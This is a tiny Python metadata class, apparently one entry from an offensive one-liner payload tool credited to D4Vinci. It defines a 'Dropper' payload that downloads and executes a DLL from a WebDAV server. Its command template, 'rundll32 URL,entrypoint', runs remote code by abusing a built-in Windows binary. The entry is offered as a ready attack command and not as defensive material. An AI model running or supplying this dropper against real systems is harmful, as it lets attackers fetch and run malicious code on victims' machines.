class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Download and execute a dll file from a webdav server."
    function    = "Dropper"
    liner       = "rundll32 URL,entrypoint"
